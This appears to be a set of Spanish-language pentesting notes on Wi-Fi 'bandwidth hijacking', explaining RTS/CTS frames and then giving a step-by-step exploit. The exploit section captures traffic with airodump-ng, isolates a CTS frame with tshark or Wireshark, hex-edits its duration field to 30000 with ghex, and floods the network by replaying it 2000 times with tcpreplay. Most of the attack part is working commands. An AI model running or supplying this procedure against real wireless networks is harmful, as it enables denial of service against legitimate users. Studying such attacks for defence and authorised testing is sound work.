# Bandwidth Hijacking

El ataque de *scuestro de ancho de banda* o *Bandwidth Hijacking* consiste en que el atacante consume gran parte del ancho de banda disponible en la red, limitando la cantidad de ancho de banda que está disponible para los usuarios legítimos. Este ataque se basa en los mecanismos de control de acceso al medio utilizados en redes inalámbricas, como **RTS** y **CTS**.

> [!info]
> ### **RTS** (Requests to send): 
> 
> ### Es una señal que se envía desde un nodo inalámbrico al nodo destinatario para solicitar el derecho de transmitir datos. Al enviar una señal **RTS**, el nodo emisor informa al nodo destinatario que desea transmitir datos y solicita la autorización para hacerlo. 
> ### Este mecanismo se utiliza para evitar la transmisión de datos de nodos inálambricos que están demasiado lejos para escuchar las señales de nodos de otros nodos inálambricos. Al enviar una señal **RTS**, el nodo emisor se asegura que el nodo destinatario esté disponible para recibir los datos antes de transmitirlos. Esto ayuda a reducir la pérdida de datos y mejora el rendimiento de la red. 
> 
> #### Paquete RTS: 
> ![[RTS.png]]


>[!info]
>### **CTS** (Clear to send):
>### Es una señal que se envía desde un nodo inalámbrico a otro para solicitar el derecho de transmitir datos. Cuando un nodo inalámbrico desea transmitir  datos, primero envía una señal **RTS** al nodo destinatario. Si el nodo destinatario está libre para recibir datos, responde con una señal **CTS** para informar al nodo emisor que puede transmitir los datos. ### El mecanismo **CTS** se utiliza para evitar colisiones entre nodos que intentan transmitir datos al mismo tiempo. Si dos nodos transmiten al mismo tiempo, se produce una colisión que puede causar la pérdida de datos. Al solicitar la autorización para transmitir mediante una señal **CTS**, se  reduce la probabilidad de colisiones yse mejora el rendimiento de la red inalámbrica. 
>
>#### Paquete CTS: 
>
>![[CTS.png]]

-----
# Exploit

Este ataque consiste en modificar un paquete **CTS** para generar un tráfico elevado, generar colisiones de datos y saturación en el ancho de banda. 

Para realizar esto, primero necesitamos capturar brevemente el tráfico de la red para conseguir un paquete **CTS** y posteriormente editarlo. 

```shell
airodump-ng --essid {essid} -c {channel} -w {file.cap} {interfaz}
```

Una vez que dejemos correr unos segundos, podemos terminar la intercepción del tráfico de red, y podemos comenzar a ver los paquetes **CTS** y analizar todo el tráfico obtenido con herramientas como `tshark` o `wireshark`. 

```shell 
# -Y para filtrar 
# -Tjson para ver en formato json
# -Tfields -e wlan.duration para filtrar por parametros
# 0x1C es el tipo/subtipo para CTS
tshark -r {file.cap} -Y "wlan.fc.type_subtype == 0x1C" 
```

En caso de utilizar `wireshark` en el apartado de "Apply a display filter" introducimos **wlan.fc.type_subtype == 0x1C**

```bash
wireshark {file.cap} &>/dev/null & disown
```

Una vez seleccionado dicho paquete nos dirigimos a **file** > **Export specified packets** > **Select packets only** > **guardar** para guardar el mismo.  

Una vez que tengamos el arhivo guardado, por ejemplo, **CTS.cap**, podremos ver de manera previa que dicho paquete cuenta con una "duración", la cual tenemos que modificar como objetivo. 
#### Ejemplo **wireshark**: 

![[CTS_time_ws.png]]

#### Ejemplo **tshark**:

```shell
tshark -r CTS.cap -Tjson
```

![[CTS_time_ts.png]]
###### Editing package

Ahora solo queda editar la duración en la que los paquetes **CTS** comunican que la conexión esta "libre", intentaremos modificar dicho valor del paquete por el valor de **30000** para asi intentar lograr saturar la red. 

Para esto utilizaremos una herramienta lamada `ghex` para editar los valores de esta captura. 

```shell
sudo ghex CTS.cap &>/dev/null & disown
```

![[ghex_cts.png]]

Nos fijamos que valores exadecimales pertenecián al "**duration time**" en wireshark, para eso abrimos el paquete **CTS**, hacemos doble click, y en la pestaña que se nos abre, tocamos  **....Duration: ......** y veremos su valor hexadecimal: 

![[CTS_ws_time.png]]

En este caso **88 00**, entendiendo que estos valores tendran que ser remplazados con la herramienta de `ghex`. 
Como queremos remplazar estos **136 microseconds** por **30000**, es necesario ver el valor hexadecimal de esto, y esto lo podemos hacer con python3 

```python
hex(30000)
```

Dando como valor **0x7530** teniendo que modificarlo en **ghex** como **30 75**, quitando el 0x e invirtiendo los valores...

![[ghex_edit_time.png]]

De esta manera si lo volvieramos a ver con `tshark` o `wireshark` veriamos que tendriamos una duración de **30000**, por lo que solo falta **replicar** el paquete **CTS editado**. 

```shell
tcpreplay --intf1={interfaz} --topspeed --loop=2000 {CTS_edited.pcap} 2>/dev/null
```

De esta manera estariamos utilizando nuestra **tarjeta de red** para tramitar 2000 paquetes **CTS** de duración de **30000**. Incluso podriamos interceptar el tráfico de red y filtrar por paquetes **CTS** para corroborar el envío de estos paquetes. 
